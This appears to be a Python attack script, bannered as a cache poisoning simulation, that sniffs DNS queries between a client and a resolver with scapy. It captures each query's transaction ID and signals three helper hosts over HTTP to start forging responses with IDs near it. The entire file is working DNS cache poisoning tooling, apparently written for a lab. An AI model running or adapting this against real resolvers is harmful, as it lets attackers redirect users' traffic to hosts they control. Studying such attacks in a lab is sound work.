import requests
from scapy.all import *
import threading

dst_ip="3.3.3.2"
src_ip="192.168.1.3"


if __name__ == "__main__":
	print("""
     _.--**--._                                           _.--**--._
    /  _    _  \\                                         /  _    _  \\
    ( (_\  /_) )                                         ( (_\  /_) )
{ \._\   /\   /_./ }                                 { \._\   /\   /_./ }
/_*=-.}______{.-=*_\\   CACHE POISONING SIMULATION    /_*=-.}______{.-=*_\\
 _  _.=(****)=._  _                                   _  _.=(****)=._  _
(_'*_.-*`~~`*-._*'_)                                 (_'*_.-*`~~`*-._*'_)
 {_*            *_}                                   {_*            *_}
	""")
	print("Waiting for new DNS requests...")
	
	while 1:
		sniffed_packet=sniff(iface="eth0", filter="src host " + src_ip + " and dst host " + dst_ip + " and dst port 53", count=1)
		if sniffed_packet[0].haslayer(DNS) and sniffed_packet[0].version == 4:
			dns=sniffed_packet[0].getlayer(DNS)
			qid=dns.id
			print("Malicious packet will be forged and sent - QID " + str(qid))
			
			threading.Thread(target=requests.get, args=('http://1.1.1.5:8888?start_qid=' + str(qid-2),)).start()
			threading.Thread(target=requests.get, args=('http://1.1.1.6:8888?start_qid=' + str(qid-1000),)).start()
			threading.Thread(target=requests.get, args=('http://1.1.1.7:8888?start_qid=' + str(qid+1000),)).start()
		
